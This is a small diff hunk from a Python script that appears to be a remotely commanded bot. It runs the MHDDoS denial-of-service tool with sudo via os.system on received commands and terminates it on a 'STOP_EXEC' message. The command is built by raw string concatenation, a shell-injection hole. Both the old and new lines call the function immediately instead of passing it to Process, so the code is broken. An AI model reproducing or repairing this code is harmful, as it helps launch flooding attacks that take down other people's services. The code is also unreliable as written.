@@ -32,7 +32,7 @@ while True:
             successful_exec = last_command
             def exec_cmd(execs):
                 os.system("sudo python3 MHDDoS/start.py " + execs)
-            t = Process(target=exec_cmd(module=execs))
+            t = Process(target=exec_cmd(execs))
     elif "STOP_EXEC" in pe:
         try:
             t.terminate()
